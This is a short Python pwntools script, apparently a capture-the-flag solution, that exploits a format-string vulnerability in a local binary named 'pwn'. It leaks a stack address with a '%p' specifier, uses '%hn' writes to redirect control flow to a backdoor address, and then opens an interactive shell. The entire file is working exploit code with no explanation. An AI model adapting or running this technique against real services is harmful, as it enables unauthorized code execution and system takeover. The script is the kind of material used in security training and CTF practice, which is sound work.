from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p = remote("127.0.0.1",36803) 
elf = ELF('./pwn')
#gdb.attach(p,'b *0x401337')
#pause()
bkd=0x40127b
def se(ss):
    p.sendafter(b'...',ss)
def pas():
    p.sendafter(b'!',b'\x00'*8)
se(b'%8$p')
p.recvuntil(b'0x')
st=int(b'0x'+p.recv(12),16)-0x18
log.debug(hex(st))
pas()
payload='%{}c%12$hn'.format(st&0xffff).encode()
se(payload)
pas()
payload='%{}c%32$hn'.format(bkd&0xffff).encode()
se(payload)
p.sendlineafter(b'!',b'sh\x00')
p.interactive()